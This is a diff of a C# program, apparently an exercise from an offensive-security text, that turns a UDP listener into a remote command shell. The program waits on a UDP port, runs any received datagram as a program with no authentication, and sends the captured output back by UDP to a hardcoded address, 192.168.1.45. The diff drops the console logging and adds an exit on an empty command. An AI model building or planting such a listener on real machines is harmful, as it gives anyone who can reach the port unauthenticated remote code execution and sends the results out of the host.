@@ -8,42 +8,41 @@ namespace ch4_udp_server
 {
 	class MainClass
 	{
-		private const int listenPort = 11000;
 		public static void Main(string[] args)
 		{
-			UdpClient listener = new UdpClient(listenPort);
-			IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
-			string received_data;
-			byte[] receive_byte_array;
+			int lport = 5555;
+			UdpClient listener = new UdpClient(lport);
+			IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, lport);
+			string command;
+			byte[] input;
 
 			try
 			{
 				while (true)
 				{
-					Console.WriteLine("Waiting for broadcast");
-					receive_byte_array = listener.Receive(ref groupEP);
-					Console.WriteLine("Received a broadcast from {0}", groupEP.ToString() );
-					received_data = Encoding.ASCII.GetString(receive_byte_array, 0, receive_byte_array.Length);
-					Console.WriteLine("data follows \n{0}\n\n", received_data);
+					input = listener.Receive(ref groupEP);
+					command = Encoding.ASCII.GetString(input, 0, input.Length);
 
-					Socket sending_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
-						ProtocolType.Udp);
-
-					IPAddress send_to_address = IPAddress.Parse("192.168.1.45");
-
-					IPEndPoint sending_end_point = new IPEndPoint(send_to_address, 11000);
-
+					if (command == string.Empty)
+						break;
+						
 					Process prc = new Process();
 					prc.StartInfo = new ProcessStartInfo();
-					prc.StartInfo.FileName = received_data;
+					prc.StartInfo.FileName = command;
 					prc.StartInfo.Arguments = "";
 					prc.StartInfo.UseShellExecute = false;
 					prc.StartInfo.RedirectStandardOutput = true;
 					prc.Start();
 					prc.WaitForExit();
 
+					Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
+						ProtocolType.Udp);
+
+					IPAddress sender = IPAddress.Parse("192.168.1.45");
+					IPEndPoint sendEP = new IPEndPoint(sender, lport);
+
 					byte[] results = Encoding.ASCII.GetBytes(prc.StandardOutput.ReadToEnd());
-					sending_socket.SendTo(results, sending_end_point);
+					sock.SendTo(results, sendEP);
 				}
 			}
 			catch (Exception e)
